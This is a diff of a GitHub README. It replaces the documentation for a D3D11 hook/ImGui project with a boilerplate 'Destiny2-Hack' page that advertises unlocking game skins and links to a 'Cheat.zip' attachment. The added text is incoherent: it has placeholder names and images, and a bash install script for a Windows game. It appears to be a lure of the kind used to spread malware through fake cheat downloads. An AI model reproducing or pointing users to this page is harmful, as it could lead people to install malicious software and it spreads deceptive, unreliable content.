@@ -1,59 +1,54 @@
-```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
+# Destiny2-Hack
 
-## :open_book: Project Overview :
+🔒 Unlock all skins, switch characters, and customize your inventory in Destiny 2 with Destiny2-Hack! 🎮
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+## Features
+- Unlock all character skins
+- Swap weapon skins
+- Change ghost skins
+- Customize ship skins
+- Modify sparrow skins
+- Alter inventory items
+- And much more!
 
-#### Features :
+![Destiny2-Hack Banner](https://example.com/banner.png)
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+## Installation
+Follow these steps to install Destiny2-Hack on your system:
 
-#### Used librairies :
+1. Clone the repository to your local machine.
+   ```bash
+   git clone https://github.com/username/Destiny2-Hack.git
+   ```
+2. Navigate to the project directory.
+   ```bash
+   cd Destiny2-Hack
+   ```
+3. Run the installation script.
+   ```bash
+   bash install.sh
+   ```
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+## Usage
+1. Launch Destiny 2 on your device.
+2. Run the Destiny2-Hack executable.
+3. Select the desired skin/character/item customization options.
+4. Enjoy your personalized Destiny 2 experience!
 
-## :rocket: Getting Started
+## Screenshots
+![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 3](https://example.com/screenshot3.png)
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+## Contributing
+We welcome contributions from the community to enhance Destiny2-Hack. Feel free to submit pull requests or open issues for any improvements or new features you'd like to see.
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## Download
+[![Download Destiny2-Hack](https://img.shields.io/badge/Download-Cheat.zip-<COLOR_CODE_HERE>)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-To see your environment variables :
+---
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
-
-### Visual Studio :
-
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
-
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
-
-## :test_tube: Demonstration :
-
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+© 2023 Destiny2-Hack. Maintained by [Your Name](https://github.com/your-profile).
